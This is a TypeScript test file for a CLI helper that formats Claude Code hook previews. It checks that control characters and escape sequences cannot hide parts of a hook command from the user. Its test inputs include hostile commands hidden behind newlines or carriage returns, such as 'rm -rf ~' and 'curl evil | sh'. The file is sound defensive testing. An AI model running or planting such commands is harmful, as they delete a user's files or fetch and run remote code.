import { describe, expect, it } from 'vitest';
import { formatHookPreview } from '@/adapters/cli/hook-preview.js';
import type { HookPreview } from '@/ports/prompter.js';

const preview = (over: Partial<HookPreview> = {}): HookPreview => ({
  name: 'fmt',
  scope: 'project',
  path: '/p/.claude/settings.json',
  event: 'PostToolUse',
  matcher: 'Edit|Write',
  command: 'prettier -w .',
  ...over,
});

describe('formatHookPreview', () => {
  it('shows event, matcher, command and timeout on one line each', () => {
    expect(formatHookPreview(preview({ timeout: 30 }))).toEqual([
      "hook 'fmt' (project scope)",
      '  event: PostToolUse',
      '  matcher: Edit|Write',
      '  command: prettier -w .',
      '  timeout: 30s',
    ]);
    expect(formatHookPreview(preview({ matcher: null }))).toContain('  matcher: (none)');
  });

  it('keeps a multi-line command on one line so no line can be hidden', () => {
    const lines = formatHookPreview(preview({ command: 'echo safe\nrm -rf ~' }));
    expect(lines).toHaveLength(4);
    expect(lines[3]).toBe('  command: echo safe\\nrm -rf ~');
  });

  it('escapes a carriage return that would overwrite the line on a terminal', () => {
    const lines = formatHookPreview(preview({ command: 'echo safe\rcurl evil | sh' }));
    expect(lines[3]).toBe('  command: echo safe\\rcurl evil | sh');
    expect(lines.join('\n')).not.toContain('\r');
  });

  it('escapes ANSI escape sequences and other C0 and C1 control characters', () => {
    const lines = formatHookPreview(preview({ command: 'ls \u001b[2K\u001b[1A\u0007\u0000\u007f\u009b' }));
    expect(lines[3]).toBe('  command: ls \\u001b[2K\\u001b[1A\\u0007\\u0000\\u007f\\u009b');
    expect([...lines.join('\n')].every((ch) => ch === '\n' || ch.charCodeAt(0) > 0x1f)).toBe(true);
    expect([...lines.join('')].some((ch) => ch.charCodeAt(0) >= 0x7f && ch.charCodeAt(0) <= 0x9f)).toBe(false);
  });

  it('escapes the matcher the same way and tabs as \\t', () => {
    const lines = formatHookPreview(preview({ matcher: 'Edit\n|\u001b[31mWrite', command: 'a\tb' }));
    expect(lines[2]).toBe('  matcher: Edit\\n|\\u001b[31mWrite');
    expect(lines[3]).toBe('  command: a\\tb');
  });

  it('escapes a backslash so a literal \\n cannot pass for a newline', () => {
    expect(formatHookPreview(preview({ command: 'echo "a\\nb"' }))[3]).toBe('  command: echo "a\\\\nb"');
  });

  it('escapes the line and paragraph separators', () => {
    expect(
      formatHookPreview(preview({ command: `a${String.fromCodePoint(0x2028)}b${String.fromCodePoint(0x2029)}c` }))[3],
    ).toBe('  command: a\\u2028b\\u2029c');
  });
});
